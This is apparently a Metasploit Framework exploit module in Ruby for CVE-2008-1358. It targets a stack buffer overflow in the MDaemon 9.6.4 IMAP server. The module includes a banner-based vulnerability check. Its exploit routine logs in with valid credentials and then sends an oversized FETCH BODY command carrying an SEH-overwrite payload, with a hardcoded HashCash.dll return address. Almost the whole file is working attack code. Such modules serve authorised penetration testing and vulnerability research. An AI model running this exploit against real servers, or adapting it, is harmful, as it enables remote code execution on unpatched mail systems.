##
# $Id: mdaemon_fetch.rb 9525 2010-06-15 07:18:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Imap
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MDaemon 9.6.4 IMAPD FETCH Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the Alt-N MDaemon IMAP Server
				version 9.6.4 by sending an overly long FETCH BODY command. Valid IMAP
				account credentials are required. Credit to Matteo Memelli
			},
			'Author'         => [ 'Jacopo Cervini', 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9525 $',
			'References'     =>
				[
					[ 'CVE', '2008-1358' ],
					[ 'OSVDB', '43111' ],
					[ 'BID', '28245' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/5248' ],
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 400,
					'BadChars' => "\x00\x0a])",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'MDaemon Version 9.6.4', { 'Ret' => 0x64dc118b } ], # p/p/r HashCash.dll
				],
			'DisclosureDate' => 'Mar 13 2008',
			'DefaultTarget' => 0))
	end

	def check
		connect
		disconnect

		if (banner and banner =~ /IMAP4rev1 MDaemon 9.6.4 ready/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect_login

		req0="0002 SELECT Inbox\r\n"

		res = raw_send_recv(req0)
		if (res and res =~ /0002 OK/)
			print_status("SELECT command OK")
		end

		req1="0003 APPEND Inbox {1}\r\n"

		res = raw_send_recv(req1)
		if (res and res =~ /Ready for append literal/)
			print_status("APPEND command OK")
		end

		res = raw_send_recv(rand_text_alpha(20) + "\r\n")
		if (res and res =~ /APPEND completed/)
			print_status("APPEND command finished")
		end

		buf = rand_text_alpha_upper(528, payload_badchars)
		buf << generate_seh_payload(target.ret) + rand_text_alpha_upper(35, payload_badchars)

		sploit = "A654 FETCH 2:4 (FLAGS BODY[" + buf + "(DATE FROM)])\r\n"

		print_status("Sending payload")

		sock.put(sploit)

		handler
		disconnect
	end

end
